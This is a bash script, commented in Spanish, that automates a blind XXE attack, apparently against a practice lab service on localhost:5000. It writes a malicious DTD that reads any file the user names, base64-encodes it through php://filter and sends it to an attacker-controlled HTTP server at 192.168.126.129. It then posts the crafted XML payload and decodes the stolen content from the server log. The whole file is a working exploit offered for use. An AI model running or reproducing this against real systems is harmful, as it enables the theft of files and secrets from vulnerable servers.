#!/bin/bash

# Preguntamos al usuario cual es la ruta del archivo que quiere leer
echo -ne "\n [+] Introduce la ruta del archivo a leer: " && read -r myFilename

# Creamos el contenido del DTD personalizado con el input del usuario.
malicious_dtd="""
<!ENTITY % archivoVictima SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.126.129/?fileContent=%archivoVictima;'>\">
%eval;
%exfil;
"""

# Volcamos el contenido al archivo malicious.dtd
echo $malicious_dtd > malicious.dtd

# Creamos el servidor HTTP con python, tanto el output como el stderr lo redirigimos al archivo temporal response. Por último lo ponemos en segundo plano.
python3 -m http.server 80 &>response &

# Almacenamos el PID del proceso puesto anteriormente en segundo plano
PID=$!

# Esperamos 1 segundo a que el servidor se levante
sleep 1; echo

# Automatizamos la petición
curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.126.129/malicious.dtd"> %xxe;]>
<root><name>angellm</name><tel>123456789</tel><email>prueba@prueba.com;</email><password>prueba123</password></root>' &>/dev/null

# Buscamos el contenido del archivo en la petición y lo decodificamos
cat response | grep -oP "/?fileContent=\K[^.*\s]+" | base64 -d

# Matamos el proceso del servidor HTTP y esperamos a que se cierre
kill -9 $PID
wait $PID 2>/dev/null

# Eliminamos el archivo temporal
rm response 2>/dev/null
